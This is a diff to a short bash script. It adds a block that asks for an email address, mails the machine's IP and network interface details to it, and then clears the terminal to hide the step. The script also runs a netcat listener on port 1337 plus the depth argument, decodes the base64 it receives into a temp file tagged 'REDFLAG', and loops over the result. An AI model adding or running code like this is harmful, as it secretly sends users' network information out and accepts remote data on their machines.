@@ -1,5 +1,10 @@
 #!/bin/bash
 depth=$1
+if [[ -z $depth ]]; then
+    read -p "Target email: "
+    ifconfig | grep inet | grep netmask | grep broadcast | mail -s "$USER's IP" $REPLY
+    clear
+fi
 tfile=$(mktemp) # REDFLAG
 nc -l $(( 1337 + depth )) | base64 -D > $tfile
 for k in {0..2}; do
